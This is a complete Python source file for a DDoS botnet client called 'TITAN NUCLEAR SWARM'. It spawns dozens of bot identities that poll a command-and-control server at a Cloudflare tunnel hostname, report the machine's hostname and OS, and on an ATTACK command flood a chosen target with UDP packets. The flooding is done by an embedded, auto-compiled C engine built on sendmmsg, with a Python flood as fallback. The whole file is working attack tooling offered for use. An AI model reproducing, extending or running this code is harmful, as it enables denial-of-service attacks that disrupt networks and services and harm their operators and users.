#!/usr/bin/env python3
"""
  ENI & LO — TITAN NUCLEAR SWARM v5.0 (2026)
  ============================================
  32 bots register to C2 separately, but share ONE
  optimized C-engine for maximum NIC saturation.

  Usage:
    python3 bot_client.py                          # 32 bots (auto = CPU cores)
    python3 bot_client.py 16                       # 16 bots
    python3 bot_client.py custom.link.com 443      # custom C2
    python3 bot_client.py 32 custom.link.com 443   # 32 bots + custom C2
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, string, os, subprocess, signal

if os.name == 'nt':
    os.system('color')

# ============================================================================
#  CONFIG
# ============================================================================
DEFAULT_C2   = "come-spectacular-northern-vip.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  NUCLEAR C-ENGINE v5 — shared across all bots
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define BATCH   1024
#define PKTSIZE 1472
#define NSOCK   4

static volatile int g_run = 1;
static char  g_ip[64];
static int   g_port;
static int   g_ncpu;
static unsigned long long g_pkts  = 0;
static unsigned long long g_bytes = 0;

void on_sig(int s) { g_run = 0; }

void* telemetry(void* x) {
    unsigned long long lp = 0, lb = 0;
    while (g_run) {
        sleep(1);
        unsigned long long cp = __atomic_load_n(&g_pkts,  __ATOMIC_RELAXED);
        unsigned long long cb = __atomic_load_n(&g_bytes, __ATOMIC_RELAXED);
        double gbps = ((cb - lb) * 8.0) / (1024.0 * 1024.0 * 1024.0);
        double mbps = ((cb - lb) * 8.0) / (1024.0 * 1024.0);
        unsigned long long pps = cp - lp;
        if (gbps >= 1.0)
            printf("\033[92m[NUCLEAR]\033[0m %llu pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Gbps\033[0m | \033[95mUDP-sendmmsg\033[0m\n", cp, pps, gbps);
        else
            printf("\033[92m[NUCLEAR]\033[0m %llu pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Mbps\033[0m | \033[95mUDP-sendmmsg\033[0m\n", cp, pps, mbps);
        fflush(stdout);
        lp = cp; lb = cb;
    }
    return NULL;
}

void* worker(void* arg) {
    int tid = *(int*)arg; free(arg);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(tid % g_ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    int fds[NSOCK];
    for (int s = 0; s < NSOCK; s++) {
        fds[s] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fds[s] < 0) fds[s] = fds[0];
        int buf = 4*1024*1024;
        setsockopt(fds[s], SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    }

    char payload[PKTSIZE];
    memset(payload, 'Z', PKTSIZE);
    struct iovec   iov[BATCH];
    struct mmsghdr msg[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base = payload; iov[i].iov_len = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name = &dst; msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov = &iov[i]; msg[i].msg_hdr.msg_iovlen = 1;
    }
    int si = 0;
    while (g_run) {
        int r = sendmmsg(fds[si], msg, BATCH, 0);
        if (r > 0) {
            __atomic_fetch_add(&g_pkts,  (unsigned long long)r,           __ATOMIC_RELAXED);
            __atomic_fetch_add(&g_bytes, (unsigned long long)r * PKTSIZE, __ATOMIC_RELAXED);
        }
        si = (si + 1) % NSOCK;
    }
    for (int s = 0; s < NSOCK; s++) close(fds[s]);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) { fprintf(stderr, "Usage: %s <ip> <port> <threads>\n", argv[0]); return 1; }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int nth = atoi(argv[3]);
    if (nth < 1) nth = 4; if (nth > 256) nth = 256;
    g_ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    signal(SIGTERM, on_sig); signal(SIGINT, on_sig);
    printf("\033[96m[NUCLEAR v5]\033[0m %s:%d | %d threads | %d cores | %d sockets\n", g_ip, g_port, nth, g_ncpu, nth*NSOCK);
    pthread_t mon; pthread_create(&mon, NULL, telemetry, NULL);
    pthread_t thr[256];
    for (int i = 0; i < nth; i++) { int* id = malloc(sizeof(int)); *id = i; pthread_create(&thr[i], NULL, worker, id); }
    for (int i = 0; i < nth; i++) pthread_join(thr[i], NULL);
    g_run = 0; pthread_join(mon, NULL);
    return 0;
}
"""

# ============================================================================
#  SHARED ENGINE STATE
# ============================================================================
engine_lock    = threading.Lock()
engine_proc    = None
engine_compiled = False
engine_bin     = None

def compile_engine():
    global engine_bin, engine_compiled
    if platform.system() != "Linux":
        return None
    binpath = os.path.join(os.getcwd(), "nuclear_engine")
    srcpath = os.path.join(os.getcwd(), "nuclear_engine.c")
    with open(srcpath, "w") as f:
        f.write(C_ENGINE)
    r = subprocess.run(["gcc", "-O3", "-march=native", "-funroll-loops", "-flto",
                        srcpath, "-o", binpath, "-lpthread"],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if r.returncode != 0:
        r = subprocess.run(["gcc", "-O3", "-funroll-loops", srcpath, "-o", binpath, "-lpthread"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if r.returncode == 0 and os.path.isfile(binpath):
        os.chmod(binpath, 0o755)
        print(f"\033[92m[+] NUCLEAR C-Engine v5 compiled OK\033[0m")
        engine_bin = binpath
        engine_compiled = True
        return binpath
    print(f"\033[91m[-] Compile failed, Python fallback\033[0m")
    return None

def start_shared_engine(target, port, threads, duration):
    global engine_proc
    with engine_lock:
        if engine_proc and engine_proc.poll() is None:
            return  # Already running
        if not engine_bin:
            return
        print(f"\033[92m[⚡ SHARED NUCLEAR ENGINE FIRING]\033[0m -> {target}:{port} | {threads} threads | {threads*4} sockets")
        try:
            engine_proc = subprocess.Popen(
                [engine_bin, target, str(port), str(threads)],
                stdout=sys.stdout, stderr=sys.stderr
            )
        except Exception as e:
            print(f"\033[91m[!] Engine error: {e}\033[0m")

def stop_shared_engine():
    global engine_proc
    with engine_lock:
        if engine_proc:
            try: engine_proc.terminate(); engine_proc.kill()
            except: pass
            engine_proc = None

# ============================================================================
#  PYTHON FALLBACK
# ============================================================================
g_fatk = False
g_fid  = None
g_fp   = 0
g_fb   = 0
g_fe   = 0

def py_udp(target, port, dur, atkid):
    global g_fatk, g_fid, g_fp, g_fb, g_fe
    end = time.time() + dur
    pld = os.urandom(1472)
    plen = len(pld)
    try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except: return
    while g_fatk and g_fid == atkid and time.time() < end:
        try:
            for _ in range(256): s.sendto(pld, (target, port))
            g_fp += 256; g_fb += plen * 256
        except: g_fe += 1
    try: s.close()
    except: pass

def py_telem(target, port, atkid):
    global g_fp, g_fb, g_fe, g_fatk, g_fid
    lp = lb = 0; lt = time.time()
    while g_fatk and g_fid == atkid:
        time.sleep(1); now = time.time(); dt = now - lt
        if dt <= 0: continue
        cp, cb = g_fp, g_fb
        gbps = ((cb-lb)*8)/(dt*1024*1024*1024); mbps = ((cb-lb)*8)/(dt*1024*1024)
        spd = f"{gbps:.2f} Gbps" if gbps >= 1 else f"{mbps:.2f} Mbps"
        print(f"\033[92m[PY-FLOOD]\033[0m {cp:,} pkts | {int((cp-lp)/dt):,} PPS | {spd}")
        lp, lb, lt = cp, cb, now

# ============================================================================
#  ATTACK COORDINATION (all bots share one engine)
# ============================================================================
current_attack_id = None
attacking = False

def fire(target, port, dur, threads, atkid, vec="UDP"):
    global current_attack_id, attacking, g_fatk, g_fid, g_fp, g_fb, g_fe
    if current_attack_id == atkid and attacking:
        return
    halt()
    current_attack_id = atkid
    attacking = True

    th = max(threads, CPU_CORES * 2)
    print(f"\n\033[91m[☢ NUCLEAR SWARM LAUNCH]\033[0m {vec} -> \033[97m{target}:{port}\033[0m | {dur}s | {th} threads")

    if engine_bin and vec == "UDP":
        start_shared_engine(target, port, th, dur)
    else:
        g_fatk = True; g_fid = atkid; g_fp = 0; g_fb = 0; g_fe = 0
        for _ in range(th):
            threading.Thread(target=py_udp, args=(target, port, dur, atkid), daemon=True).start()
        threading.Thread(target=py_telem, args=(target, port, atkid), daemon=True).start()

    def cleanup():
        time.sleep(dur)
        global attacking, current_attack_id, g_fatk
        if current_attack_id == atkid:
            attacking = False; current_attack_id = None; g_fatk = False
            stop_shared_engine()
            print(f"\n\033[92m[✓] Attack {atkid} done.\033[0m\n")
    threading.Thread(target=cleanup, daemon=True).start()

def halt():
    global attacking, current_attack_id, g_fatk
    attacking = False; current_attack_id = None; g_fatk = False
    stop_shared_engine()
    print("\033[91m[*] Attack stopped.\033[0m")

# ============================================================================
#  BOT POLLER (lightweight — just registers + polls C2)
# ============================================================================
def bot_poller(wid, c2h, c2p):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(10000,99999)}"
    proto = "https" if c2p == 443 else "http"
    base  = f"{proto}://{c2h}" if c2p in (80,443) else f"{proto}://{c2h}:{c2p}"
    poll  = f"{base}/poll"
    conn  = False
    last  = None

    while True:
        try:
            body = json.dumps({"bot_id": bid, "hostname": platform.node(),
                               "os": f"{platform.system()} {platform.release()}"}).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                if not conn:
                    print(f"\033[92m[BOT-{wid}] ONLINE: {bid}\033[0m")
                    conn = True
                raw = resp.read().decode()
                cmd = json.loads(raw) if raw else {}
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid and aid != last:
                    last = aid
                    # Only first bot triggers the shared engine
                    if wid == 1:
                        fire(cmd.get("target"), int(cmd.get("port", 80)),
                             int(cmd.get("duration", 60)),
                             int(cmd.get("threads", CPU_CORES * 2)),
                             aid, cmd.get("vector", "UDP"))
                elif act in ("STOP", "IDLE"):
                    if attacking and wid == 1:
                        halt()
                        last = None
        except:
            pass
        time.sleep(0.5 + random.uniform(0, 0.3))

# ============================================================================
#  MAIN
# ============================================================================
def main():
    args  = sys.argv[1:]
    count = CPU_CORES  # DEFAULT: 1 bot per CPU core (32 on this machine!)
    host  = DEFAULT_C2
    port  = DEFAULT_PORT

    for a in args:
        if a.isdigit() and int(a) <= 128:
            count = int(a)
        elif a.isdigit():
            port = int(a)
        elif "." in a:
            host = a

    if len(args) >= 2 and "." in args[0]:
        host = args[0]
        port = int(args[1]) if args[1].isdigit() else port
    elif len(args) >= 3:
        count = int(args[0]) if args[0].isdigit() else count
        host  = args[1] if "." in args[1] else host
        port  = int(args[2]) if args[2].isdigit() else port

    print(f"\033[91m{'='*72}\033[0m")
    print(f"\033[91m  ☢  ENI & LO — TITAN NUCLEAR SWARM v5.0 (2026)  ☢\033[0m")
    print(f"\033[91m{'='*72}\033[0m")
    print(f"  C2         : \033[93mhttps://{host}\033[0m")
    print(f"  Bot Swarm  : \033[92m{count} bots\033[0m (each registers to C2)")
    print(f"  CPU Cores  : \033[97m{CPU_CORES}\033[0m")
    print(f"  Engine     : \033[97m1 shared NUCLEAR C-Engine\033[0m")
    print(f"  Threads    : \033[97m{CPU_CORES * 2}\033[0m (auto)")
    print(f"  Sockets    : \033[97m{CPU_CORES * 2 * 4}\033[0m (multi-socket)")
    print(f"  Payload    : \033[97m1472 bytes\033[0m (max MTU)")
    print(f"  OS         : \033[97m{platform.system()} {platform.release()}\033[0m")
    print(f"\033[91m{'='*72}\033[0m\n")

    # Compile engine once
    compile_engine()

    # Spawn bot pollers as threads (lightweight, just HTTP polling)
    threads = []
    for i in range(count):
        t = threading.Thread(target=bot_poller, args=(i+1, host, port), daemon=True)
        t.start()
        threads.append(t)
        if (i+1) % 8 == 0 or i == count - 1:
            print(f"\033[92m[+] {i+1}/{count} bots spawned\033[0m")
        time.sleep(0.1)

    print(f"\n\033[92m[✓] ALL {count} BOTS ONLINE! Waiting for C2 commands...\033[0m\n")

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n\033[91m[!] Shutting down swarm...\033[0m")
        halt()

if __name__ == "__main__":
    main()
